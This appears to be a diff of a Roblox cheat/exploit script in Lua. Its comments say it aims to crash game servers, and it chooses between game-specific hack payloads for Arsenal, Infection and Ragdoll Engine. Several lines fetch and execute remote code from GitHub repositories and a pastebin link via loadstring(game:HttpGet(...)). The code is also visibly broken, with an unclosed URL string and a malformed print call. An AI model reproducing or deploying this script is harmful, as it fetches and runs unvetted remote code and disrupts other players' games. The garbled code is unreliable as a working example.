@@ -11,6 +11,7 @@
 -- Update 2 added stuff that hopefully make it so that it crashes for everyone  now at 278 lines of code or smt ok bye ily (no homo)
 -- Update 3 Did a massive update now at like 400 lines of code and added alot of more stuff and features.
 
+wait(10)
 loadstring(game:HttpGet(https://raw.githubusercontent.com/Jxq7/MyScripts/main/more-asx.lua"))();
 		wait(3)
                 print("In Process Of Executing")
@@ -33,7 +34,7 @@ local Arsenal = 286090429
 local Infection = 1165047394
  
 ------ STARTING SCRIPT --------
-nil
+local scriptwait = 10
 ------- SCRIPT HANDLER ---------------------
 local HttpService = game:GetService('HttpService')
 local AllowThirdyPartyTeleports = game:GetService('AllowThirdPartyTeleports')
@@ -52,16 +53,32 @@ local RagdollEngine = 22653509
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/ArsenalHaxx/master/TintenFisch.lua"))();
 print("YOU HAVE 35 SECONDS TO CHOOSE WHAT YOU WANT TO DO THEN THE SERVER WILL GO DOWN! IT ONLY SUPPORTS JAILBREAK, INFECTION AND ARSENAL BUT THE OTHER CODE SUPPORTS ANY GAME!!- Script Maker" player.Name)
 if  game.CreatorId == RagdollEngine then
-	print("Game = Ragdoll Engine Loading Ragdoll Engine Script")
+
+			print("Game = Ragdoll Engine Loading Ragdoll Engine Script")
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jxq7/MyScripts/main/Ragdoll%20Engine%20%5BASX%5D.lua'),true))()
         local plr = game.Players
 	plr.RespawnTime = 1
 end
 
+local StarterGui = game:GetService("StarterGui") -- not sure why you used CoreGui
+local bindable = Instance.new("BindableFunction")
 
+function bindable.OnInvoke(response)
+    print(response .. " chosen")
+end
+
+StarterGui:SetCore("SendNotification", {
+	Title = "Info",
+	Text = "I Loaded A Ragdoll Engine Script is that okay?",
+	Duration = 5,
+	Callback = bindable,
+	Button1 = "Ok,",
+	Button2 = "Bett"
+})
 
 --- ARSENAL
 if game.PlaceId == Arsenal  then
+			wait(10)
 	print(player.Name .."Is Playing Arsenal")
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/ArsenalHaxx/master/TintenFisch.lua"))();
 	if error then
@@ -74,6 +91,7 @@ end
 
 --------- infeEcCcTiOnNn
 if game.PlaceId == Infection then
+			
 	print(player.Name.. "Is Playing Infection")
 	loadstring(game:HttpGet("https://pastebin.com/raw/KRvb0vKv"))();
 		if error then
